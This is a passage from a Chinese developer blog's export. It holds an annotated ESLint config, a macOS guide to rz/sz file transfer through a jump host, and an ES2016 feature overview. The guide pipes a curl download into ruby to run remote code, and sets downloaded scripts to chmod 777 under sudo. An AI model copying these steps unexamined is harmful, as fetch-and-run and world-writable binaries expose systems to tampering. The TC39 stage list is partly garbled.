spellcheck="true">//是否允许计算后的键名什么的</span><span class="token string">"consistent-return"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//return 后面是否允许省略</span><span class="token string">"consistent-this"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"that"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//this别名</span><span class="token string">"constructor-super"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//非派生类不能调用super，派生类必须调用super</span><span class="token string">"curly"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"all"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//必须使用 if(){} 中的{}</span><span class="token string">"default-case"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//switch语句最后必须有default</span><span class="token string">"dot-location"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//对象访问符的位置，换行的时候在行首还是行尾</span><span class="token string">"dot-notation"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token string">"allowKeywords"</span><span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//避免不必要的方括号</span><span class="token string">"eol-last"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//文件以单一的换行符结束</span><span class="token string">"eqeqeq"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//必须使用全等</span><span class="token string">"func-names"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//函数表达式必须有名字</span><span class="token string">"func-style"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"declaration"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//函数风格，规定只能使用函数声明/函数表达式</span><span class="token string">"generator-star-spacing"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//生成器函数*的前后空格</span><span class="token string">"guard-for-in"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//for in循环要用if语句过滤</span><span class="token string">"handle-callback-err"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//nodejs 处理错误</span><span class="token string">"id-length"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//变量名长度</span><span class="token string">"indent"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//缩进风格</span><span class="token string">"init-declarations"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//声明时必须赋初值</span><span class="token string">"key-spacing"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token string">"beforeColon"</span><span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"afterColon"</span><span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//对象字面量中冒号的前后空格</span><span class="token string">"lines-around-comment"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//行前/行后备注</span><span class="token string">"max-depth"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//嵌套块深度</span><span class="token string">"max-len"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//字符串最大长度</span><span class="token string">"max-nested-callbacks"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//回调嵌套深度</span><span class="token string">"max-params"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//函数最多只能有3个参数</span><span class="token string">"max-statements"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//函数内最多有几个声明</span><span class="token string">"new-cap"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//函数名首行大写必须使用new方式调用，首行小写必须用不带new方式调用</span><span class="token string">"new-parens"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//new时必须加小括号</span><span class="token string">"newline-after-var"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//变量声明后是否需要空一行</span><span class="token string">"object-curly-spacing"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"never"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//大括号内是否允许不必要的空格</span><span class="token string">"object-shorthand"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//强制对象字面量缩写语法</span><span class="token string">"one-var"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//连续声明</span><span class="token string">"operator-assignment"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"always"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//赋值运算符 += -=什么的</span><span class="token string">"operator-linebreak"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"after"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//换行时运算符在行尾还是行首</span><span class="token string">"padded-blocks"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//块语句内行首行尾是否要空行</span><span class="token string">"prefer-const"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//首选const</span><span class="token string">"prefer-spread"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//首选展开运算</span><span class="token string">"prefer-reflect"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//首选Reflect的方法</span><span class="token string">"quotes"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"single"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//引号类型 `` "" ''</span><span class="token string">"quote-props"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"always"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//对象字面量中的属性名是否强制双引号</span><span class="token string">"radix"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//parseInt必须指定第二个参数</span><span class="token string">"id-match"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//命名检测</span><span class="token string">"require-yield"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//生成器函数必须有yield</span><span class="token string">"semi"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"always"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//语句强制分号结尾</span><span class="token string">"semi-spacing"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">"before"</span><span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"after"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//分号前后空格</span><span class="token string">"sort-vars"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//变量声明时排序</span><span class="token string">"space-after-keywords"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"always"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//关键字后面是否要空一格</span><span class="token string">"space-before-blocks"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"always"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//不以新行开始的块{前面要不要有空格</span><span class="token string">"space-before-function-paren"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"always"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//函数定义时括号前面要不要有空格</span><span class="token string">"space-in-parens"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"never"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//小括号里面要不要有空格</span><span class="token string">"space-infix-ops"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//中缀操作符周围要不要有空格</span><span class="token string">"space-return-throw-case"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//return throw case后面要不要加空格</span><span class="token string">"space-unary-ops"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token string">"words"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"nonwords"</span><span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//一元运算符的前/后要不要加空格</span><span class="token string">"spaced-comment"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//注释风格要不要有空格什么的</span><span class="token string">"strict"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//使用严格模式</span><span class="token string">"use-isnan"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止比较时使用NaN，只能用isNaN()</span><span class="token string">"valid-jsdoc"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//jsdoc规则</span><span class="token string">"valid-typeof"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//必须使用合法的typeof的值</span><span class="token string">"vars-on-top"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//var必须放在作用域顶部</span><span class="token string">"wrap-iife"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"inside"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//立即执行函数表达式的小括号风格</span><span class="token string">"wrap-regex"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//正则表达式字面量用小括号包起来</span><span class="token string">"yoda"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"never"</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">//禁止尤达条件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> eslint </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rz和sz的使用</title>
      <link href="2019/08/17/rz/"/>
      <url>2019/08/17/rz/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在开发过程中会遇到，需要把本地文件上传到远程服务器的情况；正常情况下可以使用scp实现文件上传；但是大部分公司内部线上服务器都是无法直接登录的，都需要通过跳板机登录，这时scp（ssh）就无法直接连接服务器了，这就需要用到rz和sz文件上传命令，可以直接跳过跳板机，连接本地和远程服务器。</p><p>一下以MAC讲解安装步骤：</p><h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><h3 id="1-安装Homebrew（已安装就无需再次安装）"><a href="#1-安装Homebrew（已安装就无需再次安装）" class="headerlink" title="1. 安装Homebrew（已安装就无需再次安装）"></a>1. 安装Homebrew（已安装就无需再次安装）</h3><blockquote><p>ruby -e “$(curl -fsSL <a href="https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;" target="_blank" rel="noopener">https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;</a>   </p></blockquote><p>   检查是否安装成功  </p><blockquote><p>brew -v</p></blockquote><p>   brew是Mac OS上的一个包管理工具，可以使用它来安装接下来要使用到的iTerm，wget等工具</p><h3 id="2-安装lrzsz命令"><a href="#2-安装lrzsz命令" class="headerlink" title="2. 安装lrzsz命令"></a>2. 安装lrzsz命令</h3><p>   lrzsz是一款在linux里可代替ftp上传和下载的程序。通过下载它来使用rz，sz</p><blockquote><p>brew install lrzsz</p></blockquote><h3 id="3-安装iTerm2"><a href="#3-安装iTerm2" class="headerlink" title="3. 安装iTerm2"></a>3. 安装iTerm2</h3><p>   iTerm2是一个Mac下的终端工具，非常好用的命令行工具。Mac自带的终端是不支持lrzsz的，需要先下载支持它的iterms。</p><pre><code>  [下载地址](https://www.iterm2.com/ )</code></pre><p>   下载到本地后直接解压安装，并将文件拖入到Applications</p><h3 id="4-安装wget（如果本地已安装-则无需再次安装）"><a href="#4-安装wget（如果本地已安装-则无需再次安装）" class="headerlink" title="4. 安装wget（如果本地已安装 则无需再次安装）"></a>4. 安装wget（如果本地已安装 则无需再次安装）</h3><blockquote><p>brew install wget</p></blockquote><h3 id="5-下载并安装automatic-zmoderm-for-iTerm2"><a href="#5-下载并安装automatic-zmoderm-for-iTerm2" class="headerlink" title="5. 下载并安装automatic zmoderm for iTerm2"></a>5. 下载并安装automatic zmoderm for iTerm2</h3><p>   如果拥有root不需要sudo</p><blockquote><p>cd /usr/local/bin  </p><p>(sudo) wget <a href="https://raw.github.com/mmastrac/iterm2-zmodem/master/iterm2-send-zmodem.sh" target="_blank" rel="noopener">https://raw.github.com/mmastrac/iterm2-zmodem/master/iterm2-send-zmodem.sh</a>  </p><p>(sudo) wget <a href="https://raw.github.com/mmastrac/iterm2-zmodem/master/iterm2-recv-zmodem.sh" target="_blank" rel="noopener">https://raw.github.com/mmastrac/iterm2-zmodem/master/iterm2-recv-zmodem.sh</a>  </p><p>改变脚本权限  </p><p>(sudo) chmod 777 /usr/local/bin/iterm2-*</p></blockquote><h3 id="6-配置iTerm2"><a href="#6-配置iTerm2" class="headerlink" title="6. 配置iTerm2"></a>6. 配置iTerm2</h3><p>   打来一个iTerm终端，进行如下操作  </p><p>   Profiles—&gt;open Profiles—&gt;Edit Profiles—&gt;Advanced—&gt;Edit Triggers—&gt; 配置如下：  </p><table><thead><tr><th>Regular expression</th><th>Action</th><th>Action</th></tr></thead><tbody><tr><td>**B0100</td><td>Run Silent Coprocess</td><td>/usr/local/bin/iterm2-send-zmodem.sh</td></tr><tr><td>**B00000000000000</td><td>Run Silent Coprocess</td><td>/usr/local/bin/iterm2-recv-zmodem.sh</td></tr></tbody></table><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/publish/fuwu.png" alt="fuwu.png">   </p><h3 id="7-使用"><a href="#7-使用" class="headerlink" title="7. 使用"></a>7. 使用</h3><p>   先通过跳板登录远程服务器</p><blockquote><p>ssh  <strong>*@relay.</strong>corp.com</p></blockquote><p>   登录成功之后，直接在终端输入rz 回车 会弹出文件选择窗口，直接选中本地文件</p><p>  <img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/publish/fuwu1.png" alt="fuwu1.png"></p><p>   等待文件上传完成</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ES7新特性</title>
      <link href="2019/08/17/es7/"/>
      <url>2019/08/17/es7/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ECMAScript 2015（ES6）新增内容很多，在 ES5 发布近 6 年（2009-11 至 2015-6）之后才将其标准化。两个发布版本之间时间跨度如此之大主要有两大原因：</p><ul><li>比新版率先完成的特性，必须等待新版的完成才能发布。</li><li>那些需要花长时间完成的特性，也顶着很大的压力被纳入这一版本，因为如果推迟到下一版本发布意味着又要等很久，这种特性也会推迟新的发布版本。</li></ul><p>因此，从 ECMAScript 2016（ES7）开始，版本发布将会变得更加频繁，每年发布一个新版本，这么一来新增内容也会更小。新版本将会包含每年截止时间之前完成的所有特性。</p><h2 id="如何设计ECMAScript"><a href="#如何设计ECMAScript" class="headerlink" title="如何设计ECMAScript"></a>如何设计ECMAScript</h2><p>TC39（推进 JavaScript 发展的委员会） 设计过程</p><p>每个 ECMAScript 特性的建议将会从阶段 0 开始， 然后经过下列几个成熟阶段。其中从一个阶段到下一个阶段必须经过 TC39 的批准。</p><h3 id="阶段-0：-Strawman-初稿"><a href="#阶段-0：-Strawman-初稿" class="headerlink" title="阶段 0： Strawman 初稿"></a>阶段 0： Strawman 初稿</h3><p><strong>什么是 Strawman？</strong></p><p>一个推进 ECMAScript 发展的自由形式的想法。该想法必须由 TC39 的会员提交，如果是非会员则必须注册成为 TC39 贡献者才能提交。</p><p><strong>必备条件：</strong></p><p>文件必须在 TC39 的会议上通过审议<a href="https://github.com/tc39/ecma262/blob/master/FAQ.md" target="_blank" rel="noopener">（原文）</a>，然后才能加入<a href="https://github.com/tc39/ecma262/blob/master/stage0.md" target="_blank" rel="noopener">阶段 0 的建议页面</a>。</p><p><strong>什么是 Draft？</strong>草案是规范的第一个版本。其与最终标准中包含的特性不会有太大差别。</p><p><strong>必备条件：</strong>建议此时必须要附加该特性的语法和语义的正式说明（使用 ECMAScript 标准的形式语言）。说明应该尽可能完善，但可以包含待办事项和占位符。该特性需要两个实验性的实现，其中一个可以在类似 Babel 的转译器（transpiler）中实现。</p><p><strong>下一步：</strong>从该阶段开始只接受增量调整。</p><h3 id="阶段-3：Candidate-候选"><a href="#阶段-3：Candidate-候选" class="headerlink" title="阶段 3：Candidate 候选"></a>阶段 3：Candidate 候选</h3><p><strong>什么是 Candidate？</strong>候选阶段，建议基本完成，此时将从实现过程和用户使用两方面获取反馈来进一步完善建议。</p><p><strong>必备条件：</strong>规范文档必须是完整的。指定的评审人（由 TC39 而不是带头人指定）和 ECMAScript 规范的编辑须在规范上签字。还有至少要两个符合规范的实现（不必指定默认实现）。</p><p><strong>下一步：</strong>此后，只有在实现和使用过程中出现了重大问题才会修改建议。</p><h3 id="阶段-4：Finished-完成"><a href="#阶段-4：Finished-完成" class="headerlink" title="阶段 4：Finished 完成"></a>阶段 4：Finished 完成</h3><p><strong>什么是 Finished？</strong>建议已经准备就绪，可以添加到标准之中。</p><p><strong>必备条件：</strong>建议进入完成阶段之前需要满足以下几点：</p><ul><li><a href="http://test262.ecmascript.org/" target="_blank" rel="noopener">Test 262</a> 的验收测试（基本上都是 JavaScript 写的用来验证语言特性的单元测试）。</li><li>两个通过测试的符合规范的实现。</li><li>特性实现相关的重要实践经验。</li><li>ECMAScript 规范的编辑在规范文本上的签字。</li></ul><p><strong>下一步：</strong> 建议将会尽快加入 ECMAScript 规范之中。当规范通过年度审核成为标准，该建议也正式成为标准的一部分。</p><h2 id="ECMAScript-2016新增特性"><a href="#ECMAScript-2016新增特性" class="headerlink" title="ECMAScript 2016新增特性"></a>ECMAScript 2016新增特性</h2><p>已被纳入 ES2016 的特性</p><ul><li>Array.prototype.includes</li><li>指数运算符</li></ul><h3 id="1、Array-prototype-includes"><a href="#1、Array-prototype-includes" class="headerlink" title="1、Array.prototype.includes"></a>1、Array.prototype.includes</h3><p>Array.prototype.includes方法返回一个布尔值，表示某个数组是否包含给定的值，与字符串的includes方法类似</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">// true</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">// false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果传入的值在当前数组（this）中则返回 true，否则返回 false</p><p>includes方法与 indexOf 方法很相似  下面两个表达式是等价的：</p><pre class="line-numbers language-js"><code class="language-js">arr<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>arr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>唯一的区别是 includes() 方法能找到 NaN，而 indexOf() 不行：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">[</span><span class="token number">NaN</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token number">NaN</span><span class="token punctuation">)</span><span class="token boolean">true</span><span class="token punctuation">[</span><span class="token number">NaN</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token number">NaN</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>includes 不会区分 +0 和 -0（这也与其他 JavaScript 特性表现一致）：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token boolean">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>为什么方法取名 <code>includes</code> 而不是 <code>contains</code>？ 后者是最初的选择，但在 web 上将会破坏已有的代码（<a href="https://esdiscuss.org/topic/having-a-non-enumerable-array-prototype-contains-may-not-be-web-compatible" target="_blank" rel="noopener">MooTools 在 <code>Array.prototype</code> 上添加了 contains 方法</a>）。</li><li>为什么方法取名 <code>includes</code> 而不是 <code>has</code>？ has 通常用于键（Map.prototype.has），includes 通常用于元素（String.prototype.includes）。集合中的元素既可以被看当做 <em>键</em> 也可被当做 <em>值</em>，所以才有 Set.prototype.has （而不是 includes）。</li><li><a href="http://exploringjs.com/es6/ch_strings.html#_checking-for-containment-and-repeating-strings" target="_blank" rel="noopener">ES6 的 <code>String.prototype.includes</code></a> 方法可用于字符串，而不能用于字符。这是否和 <code>Array.prototype.includes</code> 不一致？ 如果数组和字符串的 includes 方法是相同的工作机制，那么数组的 includes 方法就应该接受数组，而不是数组元素了。不过这两个 includes 方法都参考了 indexOf 方法；字符一般是特殊情况，而任意长度的字符串则更常见。</li></ul><h3 id="2、指数运算符"><a href="#2、指数运算符" class="headerlink" title="2、指数运算符"></a>2、指数运算符</h3><p>新提出来的特性是将 ** 作为指数操作的中缀运算符：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token number">2</span> <span class="token operator">**</span> <span class="token number">2</span> <span class="token comment" spellcheck="true">// 4</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token number">3</span> <span class="token comment" spellcheck="true">// 8</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这个运算符的一个特点是右结合，而不是常见的左结合。多个指数运算符连用时，是从最右边开始计算的。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 相当于 2 ** (3 ** 2)</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token number">3</span> <span class="token operator">**</span> <span class="token number">2</span><span class="token comment" spellcheck="true">// 512</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>上面代码中，首先计算的是第二个指数运算符，而不是第一个。</p><p>指数运算符可以与等号结合，形成一个新的赋值运算符（**=）。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token number">1.5</span><span class="token punctuation">;</span>a <span class="token operator">**</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 等同于 a = a * a;</span><span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>b <span class="token operator">**</span><span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 等同于 b = b * b * b;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意，V8 引擎的指数运算符与<code>Math.pow</code>的实现不相同，对于特别大的运算结果，两者会有细微的差异。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token number">99</span><span class="token operator">**</span><span class="token number">99</span><span class="token number">3.697296376497268e+197</span>Math<span class="token punctuation">.</span><span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token number">3.697296376497263e+197</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> es </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript Fetch封装</title>
      <link href="2019/08/15/tsfetch/"/>
      <url>2019/08/15/tsfetch/</url>
      
